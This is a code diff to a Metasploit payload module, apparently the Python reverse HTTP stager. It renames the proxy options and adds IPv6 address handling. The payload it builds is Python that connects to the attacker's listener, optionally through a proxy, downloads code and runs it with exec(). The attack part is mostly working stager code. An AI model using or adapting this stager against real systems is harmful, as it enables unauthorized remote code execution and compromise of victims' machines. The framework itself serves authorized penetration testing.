@@ -26,9 +26,9 @@ module Metasploit3
 
     register_options(
       [
-        OptString.new('PROXYHOST', [ false, "The address of an http proxy to use", "" ]),
-        OptInt.new('PROXYPORT',    [ false, "The Proxy port to connect to", 8080 ])
-      ], Msf::Handler::ReverseHttp)
+        OptString.new('PayloadProxyHost', [false, "The proxy server's IP address"]),
+        OptPort.new('PayloadProxyPort', [true, "The proxy port to connect to", 8080 ])
+      ], self.class)
   end
 
   #
@@ -41,21 +41,32 @@ module Metasploit3
       txt.gsub('\\', '\\'*4).gsub('\'', %q(\\\'))
     }
 
-    target_url  = 'http://'
-    target_url << lhost
+    if Rex::Socket.is_ipv6?(lhost)
+      target_url = "http://[#{lhost}]"
+    else
+      target_url = "http://#{lhost}"
+    end
+
     target_url << ':'
     target_url << datastore['LPORT'].to_s
     target_url << '/'
     target_url << generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITP)
 
+    proxy_host = datastore['PayloadProxyHost'].to_s
+    proxy_port = datastore['PayloadProxyPort'].to_i
+
     cmd  = "import sys\n"
-    if datastore['PROXYHOST'].blank?
+    if proxy_host == ''
       cmd << "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener()\n"
     else
-      proxy_url = "http://#{datastore['PROXYHOST']}:#{datastore['PROXYPORT']}"
+      proxy_url = Rex::Socket.is_ipv6?(proxy_host) ?
+        "http://[#{proxy_host}]:#{proxy_port}" :
+        "http://#{proxy_host}:#{proxy_port}"
+
       cmd << "ul=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['ProxyHandler','build_opener'])\n"
       cmd << "o=ul.build_opener(ul.ProxyHandler({'http':'#{var_escape.call(proxy_url)}'}))\n"
     end
+
     cmd << "o.addheaders=[('User-Agent','#{var_escape.call(datastore['MeterpreterUserAgent'])}')]\n"
     cmd << "exec(o.open('#{target_url}').read())\n"
 
